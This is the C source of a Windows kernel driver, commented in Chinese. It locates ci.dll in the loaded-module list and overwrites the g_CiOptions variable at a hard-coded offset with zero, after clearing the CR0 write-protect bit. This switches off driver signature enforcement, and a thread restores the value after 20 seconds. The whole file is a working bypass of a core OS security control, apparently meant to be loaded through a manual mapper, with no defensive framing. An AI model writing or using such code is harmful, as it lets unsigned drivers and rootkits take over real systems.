// cioff3.c -- 按固定 RVA 打 ci.dll!g_CiOptions（+0x53010，来自 CiInitialize 的位测试）
// 不创建设备对象；20 秒后自动恢复；日志 C:\ProgramData\kmaplog.txt
#include <ntifs.h>
#include <ntstrsafe.h>

#define CI_OPTIONS_RVA 0x53010

static LIST_ENTRY* g_psloaded = NULL;
static PULONG      g_target = NULL;
static ULONG       g_orig = 0;
static BOOLEAN     g_patched = FALSE;

static VOID KLog(PCSTR text)
{
    UNICODE_STRING path; OBJECT_ATTRIBUTES oa; IO_STATUS_BLOCK iosb; HANDLE h; size_t len = 0;
    RtlInitUnicodeString(&path, L"\\??\\C:\\ProgramData\\kmaplog.txt");
    InitializeObjectAttributes(&oa, &path, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    if (!NT_SUCCESS(ZwCreateFile(&h, FILE_APPEND_DATA | SYNCHRONIZE, &oa, &iosb, NULL,
                                 FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF,
                                 FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0)))
        return;
    RtlStringCchLengthA(text, 1024, &len);
    ZwWriteFile(h, NULL, NULL, NULL, &iosb, (PVOID)text, (ULONG)len, NULL, NULL);
    ZwClose(h);
}

static VOID KLogF(PCSTR fmt, ...)
{
    CHAR buf[512]; va_list ap;
    va_start(ap, fmt);
    RtlStringCchVPrintfA(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    KLog(buf);
}

static PVOID FindModuleBase(PCWSTR name)
{
    LIST_ENTRY* head = g_psloaded;
    LIST_ENTRY* cur;
    if (!head) return NULL;
    for (cur = head->Flink; cur != head && cur; cur = cur->Flink)
    {
        PUCHAR e = (PUCHAR)cur;
        USHORT nameLen = *(USHORT*)(e + 0x58);
        PWCH   nameBuf = *(PWCH*)(e + 0x60);
        if (nameLen && nameBuf)
        {
            UNICODE_STRING u, want;
            u.Buffer = nameBuf; u.Length = nameLen; u.MaximumLength = nameLen;
            RtlInitUnicodeString(&want, name);
            if (RtlEqualUnicodeString(&u, &want, TRUE))
                return *(PVOID*)(e + 0x30);
        }
    }
    return NULL;
}

static VOID WriteBytesWp(PVOID addr, const UCHAR* data, ULONG len)
{
    ULONG64 cr0 = __readcr0();
    __writecr0(cr0 & ~0x10000ULL);
    RtlCopyMemory(addr, data, len);
    __writecr0(cr0);
    KeMemoryBarrier();
}

static VOID RestoreThread(PVOID ctx)
{
    LARGE_INTEGER delay;
    UNREFERENCED_PARAMETER(ctx);
    delay.QuadPart = -200000000LL;      /* 20s */
    KeDelayExecutionThread(KernelMode, FALSE, &delay);
    if (g_patched && g_target)
    {
        WriteBytesWp(g_target, (const UCHAR*)&g_orig, sizeof(ULONG));
        KLogF("[cioff3] restored 0x%X (now 0x%X)\n", g_orig, *g_target);
    }
    PsTerminateSystemThread(STATUS_SUCCESS);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    PVOID ciBase;
    ULONG zero = 0;
    HANDLE h = NULL;
    NTSTATUS st;
    UNICODE_STRING nm;

    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    KLog("\n[cioff3] === entry ===\n");
    RtlInitUnicodeString(&nm, L"PsLoadedModuleList");
    g_psloaded = (LIST_ENTRY*)MmGetSystemRoutineAddress(&nm);
    if (!g_psloaded) { KLog("[cioff3] no module list\n"); return STATUS_UNSUCCESSFUL; }

    ciBase = FindModuleBase(L"ci.dll");
    KLogF("[cioff3] ci.dll=%p\n", ciBase);
    if (!ciBase) return STATUS_NOT_FOUND;

    g_target = (PULONG)((PUCHAR)ciBase + CI_OPTIONS_RVA);
    __try
    {
        g_orig = *g_target;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        KLog("[cioff3] read fault\n");
        return STATUS_ACCESS_VIOLATION;
    }
    KLogF("[cioff3] ci+0x%X = 0x%X\n", CI_OPTIONS_RVA, g_orig);

    WriteBytesWp(g_target, (const UCHAR*)&zero, sizeof(ULONG));
    g_patched = TRUE;
    KLogF("[cioff3] patched -> 0x%X\n", *g_target);

    st = PsCreateSystemThread(&h, THREAD_ALL_ACCESS, NULL, NULL, NULL, RestoreThread, NULL);
    if (NT_SUCCESS(st) && h) ZwClose(h);
    KLogF("[cioff3] restore thread=0x%X\n", st);
    return STATUS_SUCCESS;
}
